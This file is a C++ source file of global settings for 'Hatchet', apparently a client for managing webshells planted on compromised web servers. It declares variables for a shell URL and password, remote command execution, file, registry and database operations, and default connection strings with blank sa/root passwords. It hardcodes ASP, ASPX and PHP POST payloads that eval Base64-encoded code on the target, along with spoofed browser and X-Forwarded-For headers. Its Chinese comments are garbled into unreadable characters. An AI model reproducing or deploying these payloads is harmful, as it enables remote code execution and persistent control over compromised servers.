// stdafx.cpp : source file that includes just the standard includes
// Hatchet.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"


int		nShowTab = -1;					//��ǰ��ʾ��TAB���Աȣ�����ÿ�ζ��䣬�ŵ�ȫ�֣���Ϊ�����ߣ�û�иı�

CEdit	m_edit;							//״̬��
CEdit	m_version_edit;					//�汾

CPData* pMydb = NULL;
CStringArray MydbArray;

CPData* pMydbTmp = NULL;
CStringArray MydbTmpArray;

bool bCloseTab;//����TAB�����ع���ʧ�ܡ��ر�tab

CString szError;//http ʧ�ܷ�����Ϣ
bool	bHttpIsOK;//http �Ƿ�OK

CString			szGlobal_SiteUrl;							//Shell Url
CString			szGlobal_SiteJoinUrl;							//Shell Join Url
CString			szGlobal_SitePass;							//Shell Pass
int				nGlobal_SiteCode;							//Shell Code ����
CString			szGlobal_SiteConfig;						//Shell Config
int				nGlobal_SiteScript;							//Shell Script
CString			szGlobal_SiteFileSave;						//�����ļ������ļ�·��

//////////////////////////////////////////////////////////////////////////
CString			szCmdGetInfo[4];							//CMD����
CString			szCmdGetExec[4];							//ִ��CMD
CString			szFileGetInfo[4];							//�ļ�����
CString			szFileGetFiles[4];							//��ȡ�ļ��б�
CString			szFileGetFileContent[4];					//��ȡ�ļ�����
CString			szFileSaveFileContent[4];					//�����ļ�����
CString			szFileUpload[4];							//�ļ��ϴ�
CString			szFileDelete[4];							//�ļ�ɾ��
CString			szFileReName[4];							//�ļ�������
CString			szFileChangeTime[4];						//�޸��ļ�ʱ��
CString			szFileNewDir[4];							//�½��ļ���
CString			szFileDownFile[4];							//�����ļ�
CString			szWget[4];									//WGET

CString			szFileCopy[4];								//�ļ�����
CString			szFileCut[4];								//�ļ�����

CString			szRegistryRead[4];							//ע����ȡ
CString			szRegistryWrite[4];							//ע���д��
CString			szRegistryDelete[4];						//ע���ɾ��


CString			szDataPhpMysql;
CString			szDataPhpMssql;
CString			szDataPhpOracle;
CString			szDataPhpInformix;
CString			szDataPhpPostgreSQL;
CString			szDataPhpODBC_MSSQL;
CString			szDataPhpPDO_MYSQL;
CString			szDataPhpPDO_MSSQL;
//---------------------------------------------------------------------------
CString			szDataAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------

CString			szDataTablePhpMysql;
CString			szDataTablePhpMssql;
CString			szDataTablePhpOracle;
CString			szDataTablePhpInformix;
CString			szDataTablePhpPostgreSQL;
CString			szDataTablePhpODBC_MSSQL;
CString			szDataTablePhpPDO_MYSQL;
CString			szDataTablePhpPDO_MSSQL;
//---------------------------------------------------------------------------
CString			szDataTableAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataTableAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataTableAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataTableAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataTableAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataTableAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataColumnsPhpMysql;
CString			szDataColumnsPhpMssql;
CString			szDataColumnsPhpOracle;
CString			szDataColumnsPhpInformix;
CString			szDataColumnsPhpPostgreSQL;
CString			szDataColumnsPhpODBC_MSSQL;
CString			szDataColumnsPhpPDO_MYSQL;
CString			szDataColumnsPhpPDO_MSSQL;

//---------------------------------------------------------------------------
CString			szDataColumnsAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataColumnsAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataColumnsAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataColumnsAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataColumnsAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataColumnsAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataExecPhpMysql;
CString			szDataExecPhpMssql;
CString			szDataExecPhpOracle;
CString			szDataExecPhpInformix;
CString			szDataExecPhpPostgreSQL;
CString			szDataExecPhpODBC_MSSQL;
CString			szDataExecPhpPDO_MYSQL;
CString			szDataExecPhpPDO_MSSQL;
//---------------------------------------------------------------------------
CString			szDataExecAspSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataExecAsp1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataExecAsp2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szDataExecAspxSqlServer;
/*
<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>
*/
CString			szDataExecAspx1;
/*
<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
<C>Dsn=DsnName;</C>
*/
CString			szDataExecAspx2;
/*
<C>Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb</C>
<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\test.mdb</C>
*/
//---------------------------------------------------------------------------
CString			szProxyGetInfo;


//////////////////////////////////////////////////////////////////////////		INI����
CString			Ini_szUser_Agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
CString			Ini_szHeaders = "Accept-Language: en-us\r\nContent-Type: application/x-www-form-urlencoded\r\n";
bool			Ini_bReferer = true;
bool			Ini_bX_Forwarded_For = true;

CString			Ini_szASP_POST_DATA = "=Execute(\"Execute(\"\"On+Error+Resume+Next:Response.Clear:";
CString			Ini_szASPX_POST_DATA = "=Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(%nPageCode%).GetString("
"System.Convert.FromBase64String(\"%szBase64EvalCode%\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();";
CString			Ini_szPHP_POST_DATA = "=@eval(base64_decode($_POST[z0]));&z0=";
CString			Ini_szPHP_POST_Z0_DATA = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);";

//////////////////////////////////////////////////////////////////////////
CFont			m_FontSample;									//���Ҫ���������� �ȿ�����
CStringArray	szGlobal_RandType;
CStringArray	szGlobal_RandTypeExclude;